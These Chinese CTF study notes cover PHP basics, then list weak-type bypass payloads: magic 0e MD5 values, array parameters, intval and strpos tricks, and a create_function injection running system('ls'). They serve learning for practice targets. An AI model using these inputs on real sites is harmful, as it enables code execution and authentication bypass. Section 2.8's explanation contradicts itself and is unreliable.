# 03 · PHP 基础与弱类型绕过（task3）

> 状态：✅ 漏洞已会 / ⚠️ 基础语法需巩固

---

# 一、PHP 基础语法

## 1.1 变量

```php
$x = 5;
$y = "hello";           // 以 $ 开头
$z = $x + 3;
echo $z;                // 输出 8
```

- 变量以 `$` 开头，区分大小写
- **双引号解析变量，单引号不解析**：
```php
$t = "菜鸟";
echo "学习$t";    // 学习菜鸟
echo '学习$t';    // 学习$t
```
- **`.` 是字符串拼接**（不是 `+`）：
```php
echo "a" . "b";   // ab
```

## 1.2 作用域

| 作用域 | 说明 |
|---|---|
| `local` | 函数内，仅函数内有效 |
| `global` | 函数外定义，**函数内默认访问不到** |
| `static` | 函数内，执行完**不销毁** |

```php
function f() { global $x; $x = 1; }     // 用 global 关键字
function g() { $GLOBALS['x'] = 1; }     // 或用 $GLOBALS 数组
function h() { static $n = 0; $n++; }   // static 累加
```

## 1.3 数据类型（8 种）

| 类别 | 类型 |
|---|---|
| 标量 | `int` `float` `string` `bool` |
| 复合 | `array` `object` |
| 特殊 | `null` `resource` |

**⭐ 转 bool 为 false 的值**：`0`、`0.0`、`""`、`"0"`、`null`、空数组 `[]`

## 1.4 数字进制（**考点**）

```php
$a = 123;      // 十进制
$b = 0123;     // 八进制（0 开头）  = 83
$c = 0x1A;     // 十六进制（0x）    = 26
$d = 0b101;    // 二进制（0b）      = 5
$e = 2.5e3;    // 科学计数法        = 2500
```

## 1.5 数组

```php
// 索引数组（下标从 0）
$cars = ["Volvo", "BMW"];
echo $cars[0];              // Volvo

// 关联数组
$age = ["Peter" => 35];
echo $age["Peter"];         // 35

// 遍历
foreach ($age as $k => $v) { echo "$k: $v"; }
```

常用函数：`count()` `array_push()` `array_pop()` `in_array()` `array_keys()` `array_values()`

## 1.6 字符串函数

| 函数 | 作用 |
|---|---|
| `strlen()` | **字节数**（中文按 3 字节算） |
| `strpos($s, $sub)` | 找子串位置（**找到返回下标，找不到返回 false**） |
| `str_replace()` | 替换 |
| `substr()` | 截取 |
| `strtolower()` / `strtoupper()` | 大小写 |
| `trim()` | 去首尾空白 |
| `strrchr($s, '.')` | 从**最后一个**点取到末尾（常用来取扩展名） |

## 1.7 GET / POST

```php
// GET：参数在 URL
// <form method="get"> → 提交后 URL 变成 ?fname=xx&age=18
echo $_GET["fname"];

// POST：参数在请求体
echo $_POST["fname"];
```

**超全局数组**：`$_GET` `$_POST` `$_REQUEST` `$_COOKIE` `$_FILES` `$_SERVER`

## 1.8 类与对象

```php
class Student {
    public $name;                       // 属性
    public function show() {            // 方法
        echo $this->name;               // $this = 调用者
    }
}
$s = new Student();      // 实例化
$s->name = "小明";       // 用 -> 访问
$s->show();
```

| 语法 | 含义 |
|---|---|
| `class` | 定义类 |
| `new` | 实例化（按模板造对象） |
| `->` | 访问对象成员 |
| `$this` | 当前对象（谁调用就是谁） |
| `public` | 公开（外部可读写） |
| `protected` | 受保护（自己+子类） |
| `private` | 私有（只有自己） |

---

# 二、PHP 弱类型绕过（**核心考点**）

## 2.1 `==` 弱比较 vs `===` 强比较

```php
$a = $_GET['a'];
if ($a == 123) { echo "绕过成功"; }
```
**payload**：`?a=123abc`
**原理**：`"123abc"` 自动转数字 → `123` → 相等 ✅

**⚠️ `===` 不会转换，无此漏洞。**

## 2.2 0e 哈希绕过

```php
if (md5($x) == md5($y)) { ... }
```
**原理**：某些字符串的 md5 值形如 `0e12345...`，**宽松比较时被当科学计数法 = 0**。

**两个经典值**：
```
240610708   →  md5 = 0e462097431906509019562988736854
QNKCDZO     →  md5 = 0e830400451993494058024219903391
```
**payload**：`?a=240610708&b=QNKCDZO`

## 2.3 数组绕过（**最高频**）

**原理**：很多函数**收数组会出错，返回 `null`**，而 `null == 0` 成立。

| 函数 | 传数组 | 结果 |
|---|---|---|
| `md5([])` | 返回 `null` | `null == 0` ✅ |
| `sha1([])` | 返回 `null` | ✅ |
| `strcmp([], "x")` | 返回 `null` | ✅ |
| `strcasecmp([], "x")` | 返回 `null` | ✅ |
| `array_search([], [..])` | 返回 `null` | ✅ |
| `preg_match("/x/", [])` | 返回 `false` | 过滤失效 ✅ |
| **(string)[]** | 返回 `"Array"` | 两个数组哈希相同 ✅ |

**payload**：`?a[]=1` 或 `a[]=1&b[]=2`

**⚠️ PHP 8 差异**：`md5/sha1/strcmp` 传数组会**抛 TypeError**（数组绕过失效）；但 `(string)$arr` 仍返回 `"Array"`。

## 2.4 intval 截断

```php
if (intval($id) === 1) { ... }
```
**payload**：`?id=1abc`
**原理**：`intval` 从左侧提数字，**遇到字母停止**。

**带自动进制**：`intval($x, 0)` 会按前缀识别进制
```
0x2f  → 十六进制 → 47
0123  → 八进制
```

## 2.5 strpos 返回值陷阱

```php
if (strpos($str, 'flag') == false) { ... }
```
**payload**：`?str=flagxxx`
**原理**：`flag` 在下标 **0** → 返回 `0` → **`0 == false` 成立** → 判断出错。
**修复**：用 `=== false`。

## 2.6 switch 弱转换

```php
switch ($num) { case 0: echo "成功"; }
```
**payload**：`?num=0abc`
**原理**：switch 自动转数字，字母开头的字符串 → `0`。

## 2.7 create_function 注入

```php
$f = create_function('$a', $code);      // $code 可控
```
**payload**：`?func=};system('ls');//`
**原理**：拼接字符串生成匿名函数，用 `}` 提前闭合函数体再注入代码。

## 2.8 科学计数法绕过长度限制

```php
if (intval($x) > 114514 && strlen($x) <= 3) { ... }
```
**payload**：`114=1e7`
**原理**：`intval("1e7")` = 1（截断），但字符串长度只有 3。

---

# 三、PHP 8 差异（**务必注意**）

| 表达式 | PHP 5/7 | PHP 8 |
|---|---|---|
| `"123abc" == 123` | `true` | **`false`** |
| `"abc" == 0` | `true` | **`false`** |
| `md5([])` | `null` | **抛 TypeError** |
| `strcmp([], "x")` | `null` | **抛 TypeError** |
| `"NSS" == 0` | `true` | **`false`** |
| **0e 弱比较** | ✅ | **✅ 仍有效** |
| **`(string)[]` = `"Array"`** | ✅ | **✅ 仍有效** |

**⚠️ 打靶场先确认 PHP 版本**（`phpinfo` / 响应头 `X-Powered-By`）。

---

# 四、一句话

> **PHP 弱类型的核心：`==` 会自动转换类型** → **`"123abc"==123`、0e 哈希、数组返回 null 都是绕过点**。**`intval` 截断到字母、`strpos` 返回 0 被当 false**。**PHP 8 收紧了大部分弱比较，但 0e 和 `(string)[]` 仍有效**。
